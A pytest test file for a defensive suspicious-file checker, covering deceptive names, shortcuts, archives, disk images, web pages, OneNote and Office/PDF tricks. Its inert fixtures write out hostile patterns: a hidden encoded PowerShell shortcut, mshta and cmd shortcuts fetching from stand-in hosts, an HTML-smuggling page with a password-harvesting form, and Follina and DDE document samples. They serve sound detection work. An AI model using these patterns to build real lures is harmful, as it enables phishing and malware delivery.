"""Check a suspicious file: names built to deceive, shortcuts, archives, disk images, web pages, OneNote, and the
Office / PDF tricks that run something on opening. Every fixture is built here and harmless; nothing is run."""
import struct
import zipfile
import zlib

import pytest

from zbtriage import filecheck as fc
from test_desktop_toolkit import _dt_shortcut


def _write(tmp_path, name, data):
    path = tmp_path / name
    path.write_bytes(data)
    return str(path)


# --- names ------------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("name, expect", [
    ("invoice.pdf.exe", "two endings"),
    ("photo.JPG.scr", "two endings"),
    ("report.docx.lnk", "two endings"),
    ("invoice\u202efdp.exe", "right-to-left"),
    ("contract.pdf                    .exe", "row of spaces"),
])
def test_names_built_to_deceive(name, expect):
    assert any(expect in t for t in fc.fc_name_tricks(name))


@pytest.mark.parametrize("name", ["setup.exe", "report.pdf", "archive.tar.gz", "photo.jpg", "my.notes.txt",
                                  "v1.2.3.exe", "backup.zip"])
def test_ordinary_names_are_not_tricks(name):
    assert fc.fc_name_tricks(name) == []


def test_a_direction_changing_name_is_shown_safely():
    shown = fc.fc_show_name("invoice\u202efdp.exe")
    assert "\u202e" not in shown and "<U+202E>" in shown


def test_a_trick_name_makes_the_result_worth_a_look(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "notes.txt.exe", b"just text, nothing else"))
    assert rec["level"] == fc.FC_LOOK and rec["name_tricks"]
    assert "ITS NAME" in fc.fc_render(rec)


# --- shortcuts ------------------------------------------------------------------------------------------------

def test_a_shortcut_that_runs_an_encoded_hidden_command(tmp_path):
    raw = _dt_shortcut(target=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                       arguments="-w hidden -enc " + "A" * 60, icon=r"C:\Windows\System32\imageres.dll")
    rec = fc.fc_examine(_write(tmp_path, "Invoice.pdf.lnk", raw))
    flags = " ".join(rec["shortcut"]["flags"])
    assert "system tool" in flags and "encoded" in flags and "hidden window" in flags
    assert "powershell.exe" in rec["shortcut"]["starts"]
    assert rec["level"] == fc.FC_LOOK
    assert "SHORTCUT" in fc.fc_render(rec)


def test_a_shortcut_to_a_web_address(tmp_path):
    raw = _dt_shortcut(target=r"C:\Windows\System32\mshta.exe", arguments="https://example.invalid/x.hta")
    flags = fc.fc_shortcut(raw)["flags"]
    assert any("internet" in f for f in flags) and any("mshta" in f for f in flags)


def test_an_ordinary_shortcut_raises_nothing(tmp_path):
    raw = _dt_shortcut(target=r"C:\Program Files\Mozilla Firefox\firefox.exe")
    rec = fc.fc_examine(_write(tmp_path, "Firefox.lnk", raw))
    assert rec["shortcut"]["flags"] == [] and rec["level"] == fc.FC_CLEAN


def test_a_damaged_shortcut_is_still_read_as_text():
    shortcut = fc.fc_shortcut(b"L\x00\x00\x00 not a real shortcut powershell -enc " + b"Q" * 40)
    assert any("encoded" in f for f in shortcut["flags"]) and not shortcut["complete"]


# --- archives -------------------------------------------------------------------------------------------------

def _zip(tmp_path, name, members):
    path = tmp_path / name
    with zipfile.ZipFile(path, "w") as z:
        for member, data in members:
            z.writestr(member, data)
    return str(path)


def test_an_archive_holding_a_program_and_a_trick_name(tmp_path):
    path = _zip(tmp_path, "docs.zip", [("readme.txt", "hello"), ("scan/invoice.pdf.exe", b"MZ" + b"\0" * 64),
                                       ("inner.iso", b"\0" * 10)])
    rec = fc.fc_examine(path)
    arc = rec["archive"]
    assert arc["type"] == "ZIP" and arc["count"] == 3
    assert arc["risky"] == ["scan/invoice.pdf.exe", "inner.iso"]
    assert arc["nested"] == ["inner.iso"] and arc["tricks"]
    assert rec["level"] == fc.FC_LOOK
    assert "WHAT IS INSIDE" in fc.fc_render(rec)


def test_a_password_locked_archive_is_worth_a_look(tmp_path):
    inner = _write(tmp_path, "statement.exe", b"MZ" + b"\0" * 64)
    sealed = str(tmp_path / "statement.zip")
    fc.fc_seal(inner, sealed)                                  # the tool's own ZipCrypto writer: password "infected"
    rec = fc.fc_examine(sealed)
    assert rec["archive"]["encrypted"] and rec["level"] == fc.FC_LOOK
    assert "locked with a password" in fc.fc_render(rec)


def test_an_ordinary_archive_is_listed_not_flagged(tmp_path):
    rec = fc.fc_examine(_zip(tmp_path, "photos.zip", [("a.jpg", b"\xff\xd8x"), ("b.jpg", b"\xff\xd8y")]))
    assert rec["archive"]["risky"] == [] and not rec["archive"]["encrypted"] and rec["level"] == fc.FC_CLEAN


def test_rar_and_7z_are_named_but_not_unpacked(tmp_path):
    assert fc.fc_archive(_write(tmp_path, "a.rar", b"Rar!\x1a\x07\x00" + b"\0" * 32), b"Rar!")["type"] == "RAR"
    assert fc.fc_archive(_write(tmp_path, "a.7z", b"7z\xbc\xaf\x27\x1c" + b"\0" * 32), b"7z\xbc\xaf")["type"] == "7-Zip"


# --- disk images ----------------------------------------------------------------------------------------------

def _dir_record(name, lba, size, is_dir=False):
    raw = name.encode("ascii")
    length = 33 + len(raw) + (1 if len(raw) % 2 == 0 else 0)
    rec = bytearray(length)
    rec[0] = length
    struct.pack_into("<I", rec, 2, lba)
    struct.pack_into(">I", rec, 6, lba)
    struct.pack_into("<I", rec, 10, size)
    struct.pack_into(">I", rec, 14, size)
    rec[25] = 2 if is_dir else 0
    rec[32] = len(raw)
    rec[33:33 + len(raw)] = raw
    return bytes(rec)


def _iso(names):
    """A tiny ISO 9660 image: system area, primary descriptor at sector 16, terminator, root folder at sector 18."""
    root = _dir_record("\x00", 18, 2048, True) + _dir_record("\x01", 18, 2048, True)
    root += b"".join(_dir_record(n, 19, 4) for n in names)
    pvd = bytearray(2048)
    pvd[0], pvd[1:6], pvd[6] = 1, b"CD001", 1
    pvd[156:156 + 34] = _dir_record("\x00", 18, 2048, True)
    term = bytearray(2048)
    term[0], term[1:6], term[6] = 255, b"CD001", 1
    return b"\0" * (16 * 2048) + bytes(pvd) + bytes(term) + root.ljust(2048, b"\0") + b"DATA".ljust(2048, b"\0")


def test_an_iso_holding_a_shortcut_is_worth_a_look(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "parcel.iso", _iso(["README.TXT;1", "INVOICE.LNK;1", "DOCS"])))
    disk = rec["disk"]
    assert disk["type"] == "ISO disk image" and disk["listed"]
    assert "INVOICE.LNK" in disk["entries"] and disk["risky"] == ["INVOICE.LNK"]
    assert rec["level"] == fc.FC_LOOK
    assert "DISK IMAGE" in fc.fc_render(rec)


def test_an_iso_of_documents_is_listed_not_flagged(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "photos.iso", _iso(["A.JPG;1", "B.JPG;1"])))
    assert rec["disk"]["risky"] == [] and rec["level"] == fc.FC_CLEAN


def test_virtual_disks_are_recognised_and_worth_a_look(tmp_path):
    vhdx = fc.fc_examine(_write(tmp_path, "scan.vhdx", b"vhdxfile" + b"\0" * 1024))
    assert vhdx["disk"]["type"] == "VHDX virtual disk" and vhdx["level"] == fc.FC_LOOK
    vhd = fc.fc_examine(_write(tmp_path, "scan.vhd", b"\0" * 2048 + b"conectix" + b"\0" * 504))
    assert vhd["disk"]["type"] == "VHD virtual disk"


def test_a_damaged_iso_gives_a_short_answer_not_a_crash(tmp_path):
    raw = bytearray(_iso(["A.EXE;1"]))
    raw[16 * 2048 + 156 + 2:16 * 2048 + 156 + 6] = struct.pack("<I", 999999)     # root folder far past the end
    rec = fc.fc_examine(_write(tmp_path, "broken.iso", bytes(raw)))
    assert rec["disk"] is None or rec["disk"]["entries"] == []


# --- web pages ------------------------------------------------------------------------------------------------

def test_html_smuggling_and_a_password_box(tmp_path):
    page = ("<html><body><form action='https://collect.example.invalid/p' method='post'>"
            "<input type='password' name='p'></form><script>var b = new Blob([atob('" + "QUJD" * 600 + "')]);"
            "var a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = 'invoice.iso';"
            "a.click();</script></body></html>")
    rec = fc.fc_examine(_write(tmp_path, "invoice.html", page.encode()))
    web = " ".join(rec["web"])
    assert "HTML smuggling" in web and "encoded text" in web and "collect.example.invalid" in web
    assert rec["level"] == fc.FC_LOOK and "WEB PAGE" in fc.fc_render(rec)


def test_an_svg_with_a_script(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "logo.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>"))
    assert any("SVG" in w for w in rec["web"])


def test_an_ordinary_page_raises_nothing(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "page.html", b"<!doctype html><html><body><p>Hello</p></body></html>"))
    assert rec["web"] == [] and rec["level"] == fc.FC_CLEAN


# --- OneNote --------------------------------------------------------------------------------------------------

def test_a_onenote_file_carrying_a_program(tmp_path):
    body = fc._FC_ONE_MAGIC + b"\0" * 200 + fc._FC_ONE_FILE + b"\0" * 20 + b"MZ" + b"\0" * 100
    rec = fc.fc_examine(_write(tmp_path, "notes.one", body))
    assert rec["onenote"] == {"embedded": 1, "risky": ["a Windows program"]}
    assert rec["level"] == fc.FC_LOOK and "ONENOTE" in fc.fc_render(rec)


def test_a_onenote_file_with_a_picture_is_not_flagged(tmp_path):
    body = fc._FC_ONE_MAGIC + b"\0" * 200 + fc._FC_ONE_FILE + b"\0" * 20 + b"\x89PNG" + b"\0" * 100
    rec = fc.fc_examine(_write(tmp_path, "notes.one", body))
    assert rec["onenote"]["embedded"] == 1 and rec["onenote"]["risky"] == [] and rec["level"] == fc.FC_CLEAN


# --- Office and PDF -------------------------------------------------------------------------------------------

def _docx(tmp_path, name, rels, document="<w:document/>", extra=()):
    members = [("[Content_Types].xml", "<Types/>"), ("word/document.xml", document),
               ("word/_rels/document.xml.rels", "<Relationships>" + rels + "</Relationships>")] + list(extra)
    path = tmp_path / name
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:    # deflated, like a real Office file
        for member, data in members:
            z.writestr(member, data)
    return str(path)


REL = '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{}" ' \
      'Target="{}" TargetMode="External"/>'


def test_a_remote_template_is_found_in_a_compressed_part(tmp_path):
    rec = fc.fc_examine(_docx(tmp_path, "cv.docx", REL.format("attachedTemplate", "https://tpl.example.invalid/t.dotm")))
    assert any("remote template" in d and "tpl.example.invalid" in d for d in rec["document"])
    assert rec["level"] == fc.FC_LOOK


def test_the_follina_trick(tmp_path):
    rec = fc.fc_examine(_docx(tmp_path, "letter.docx", REL.format("oleObject", "mhtml:https://x.example.invalid/a!x-usc:b")))
    assert any("Follina" in d for d in rec["document"])


def test_an_ordinary_hyperlink_is_not_reported(tmp_path):
    rec = fc.fc_examine(_docx(tmp_path, "links.docx", REL.format("hyperlink", "https://www.example.org/")))
    assert rec["document"] == [] and rec["level"] == fc.FC_CLEAN


def test_dde_excel4_macros_and_equation_editor(tmp_path):
    dde = _docx(tmp_path, "dde.docx", "", document='<w:document><w:instrText> DDEAUTO c:\\\\x "y"</w:instrText></w:document>')
    assert any("DDE" in d for d in fc.fc_examine(dde)["document"])
    xl = tmp_path / "book.xlsx"
    with zipfile.ZipFile(xl, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/workbook.xml", "<workbook/>")
        z.writestr("xl/macrosheets/sheet1.xml", "<xm:macrosheet/>")
    assert any("Excel 4.0" in d for d in fc.fc_examine(str(xl))["document"])
    eq = _docx(tmp_path, "eq.docx", "", extra=[("word/embeddings/oleObject1.bin", b"\0" * 40 + fc._FC_EQNEDT_BIN)])
    assert any("Equation Editor" in d for d in fc.fc_examine(eq)["document"])


def test_equation_editor_in_rtf(tmp_path):
    rtf = b"{\\rtf1{\\object\\objemb{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000" \
          b"0b0000004571756174696f6e2e3300}}}"
    rec = fc.fc_examine(_write(tmp_path, "old.rtf", rtf))
    assert any("Equation Editor" in d for d in rec["document"])


def test_javascript_hidden_in_a_compressed_pdf_stream(tmp_path):
    hidden = zlib.compress(b"<< /Type /Action /S /JavaScript /JS (app.alert(1)) >>")
    pdf = (b"%PDF-1.7\n1 0 obj\n<< /Length " + str(len(hidden)).encode() + b" /Filter /FlateDecode >>\nstream\n"
           + hidden + b"\nendstream\nendobj\n%%EOF\n")
    rec = fc.fc_examine(_write(tmp_path, "form.pdf", pdf))
    assert "runs JavaScript" in rec["document"]


def test_an_ordinary_pdf_raises_nothing(tmp_path):
    body = zlib.compress(b"BT /F1 12 Tf (Hello) Tj ET")
    pdf = (b"%PDF-1.4\n1 0 obj\n<< /Length " + str(len(body)).encode() + b" /Filter /FlateDecode >>\nstream\n"
           + body + b"\nendstream\nendobj\n%%EOF\n")
    assert fc.fc_examine(_write(tmp_path, "plain.pdf", pdf))["document"] == []


def test_a_pdf_stream_bomb_is_capped():
    bomb = zlib.compress(b"\0" * (64 * 1024 * 1024))
    data = b"%PDF-1.7\nstream\n" + bomb + b"\nendstream\n"
    assert len(fc.fc_pdf_streams(data, limit=1024 * 1024)) <= 1024 * 1024


# --- false alarms found on ordinary program files, kept from coming back -----------------------------------------

def test_ordinary_start_menu_shortcuts_are_not_flagged():
    for target, args in ((r"C:\Windows\System32\cmd.exe", "/k git-cmd.bat"),
                         (r"C:\Windows\System32\rundll32.exe", "shell32.dll,Control_RunDLL desk.cpl"),
                         (r"C:\Windows\System32\msiexec.exe", "/x {12345678-1234-1234-1234-123456789012}"),
                         (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe", "")):
        assert fc.fc_shortcut(_dt_shortcut(target=target, arguments=args))["flags"] == [], target


def test_a_web_address_in_a_shortcut_description_is_not_what_it_runs():
    raw = _dt_shortcut(target=r"C:\Program Files\LibreOffice\program\soffice.exe", arguments="--safe-mode",
                       description="Provided by The Document Foundation. See https://www.documentfoundation.org")
    assert fc.fc_shortcut(raw)["flags"] == []


def test_a_command_prompt_shortcut_with_a_web_address_is_flagged():
    raw = _dt_shortcut(target=r"C:\Windows\System32\cmd.exe", arguments="/c start https://example.invalid/a.exe")
    flags = fc.fc_shortcut(raw)["flags"]
    assert any("cmd" in f for f in flags) and any("internet" in f for f in flags)


def test_libraries_and_source_inside_an_archive_are_not_risky(tmp_path):
    rec = fc.fc_examine(_zip(tmp_path, "python313.zip", [("os.py", "x"), ("lib/_ssl.dll", b"MZ"), ("data.bin", b"0")]))
    assert rec["archive"]["risky"] == [] and rec["level"] == fc.FC_CLEAN


def test_a_pdf_that_only_opens_at_a_page_is_not_flagged(tmp_path):
    pdf = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction [3 0 R /Fit] /AA << >> >>\nendobj\n%%EOF\n"
    assert fc.fc_examine(_write(tmp_path, "manual.pdf", pdf))["document"] == []


def test_javascript_on_opening_is_named_as_such(tmp_path):
    pdf = b"%PDF-1.4\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (x) >> >>\nendobj\n%%EOF\n"
    assert fc.fc_examine(_write(tmp_path, "form.pdf", pdf))["document"] == ["runs JavaScript as soon as it is opened"]


def test_a_help_page_mentioning_commands_is_not_a_script(tmp_path):
    page = b"<html><body><p>Run regsvr32 to register.</p><a href='https://example.org/folders'>folders</a></body></html>"
    rec = fc.fc_examine(_write(tmp_path, "manual.html", page))
    assert rec["script"] == [] and rec["level"] == fc.FC_CLEAN


def test_scripts_deep_in_a_big_code_bundle_are_not_risky(tmp_path):
    members = [("swagger/lang/{}.js".format(i), "x") for i in range(30)] + [("swagger/index.html", "<html>")]
    assert fc.fc_examine(_zip(tmp_path, "swagger.zip", members))["archive"]["risky"] == []


def test_a_script_at_the_top_of_an_archive_is_risky(tmp_path):
    members = [("photos/{}.jpg".format(i), b"\xff\xd8") for i in range(30)] + [("invoice.js", "x")]
    assert fc.fc_examine(_zip(tmp_path, "invoice.zip", members))["archive"]["risky"] == ["invoice.js"]


def test_a_script_in_a_small_archive_is_risky_even_in_a_folder(tmp_path):
    assert fc.fc_examine(_zip(tmp_path, "scan.zip", [("docs/scan.vbs", "x")]))["archive"]["risky"] == ["docs/scan.vbs"]


def test_a_program_deep_in_a_big_archive_is_still_risky(tmp_path):
    members = [("a/b/{}.txt".format(i), "x") for i in range(30)] + [("a/b/c/update.exe", b"MZ")]
    assert fc.fc_examine(_zip(tmp_path, "big.zip", members))["archive"]["risky"] == ["a/b/c/update.exe"]


def test_a_java_program_is_named_not_unpacked(tmp_path):
    members = [("META-INF/MANIFEST.MF", "Main-Class: A"), ("A.class", b"\xca\xfe"), ("res/x.js", "x")]
    arc = fc.fc_examine(_zip(tmp_path, "tool.jar", members))["archive"]
    assert arc["type"] == "Java program (JAR)" and arc["risky"] == []
